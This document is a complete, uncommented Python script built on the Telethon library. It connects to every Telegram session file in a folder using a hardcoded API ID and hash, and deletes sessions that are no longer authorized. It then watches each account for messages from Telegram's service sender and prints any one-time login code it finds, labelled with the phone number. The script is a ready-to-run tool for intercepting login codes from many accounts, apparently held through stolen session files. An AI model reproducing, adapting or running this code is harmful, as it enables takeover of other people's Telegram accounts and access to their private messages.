import os, asyncio, re
from telethon import TelegramClient, events

API_ID = 34946540
API_HASH = "7554a5e9dd52df527bfc39d8511413fd"
SESSION_DIR = "sessions"

clients = {}

def norm(p): return p.replace(".session","")

async def main():
    while True:
        for fn in os.listdir(SESSION_DIR):
            if not fn.endswith(".session"): continue

            phone=norm(fn)
            if phone in clients: continue

            path=os.path.join(SESSION_DIR, fn)
            client=TelegramClient(path, API_ID, API_HASH)
            await client.connect()

            if not await client.is_user_authorized():
                os.remove(path)
                continue

            print("[CONNECTED]", phone)

            @client.on(events.NewMessage)
            async def handler(event, p=phone):
                if event.sender_id==777000:
                    m=re.search(r"\b\d{4,8}\b", event.raw_text or "")
                    if m:
                        print("[OTP]", p, m.group(0))

            clients[phone]=client
            asyncio.create_task(client.run_until_disconnected())

        await asyncio.sleep(2)

asyncio.run(main())
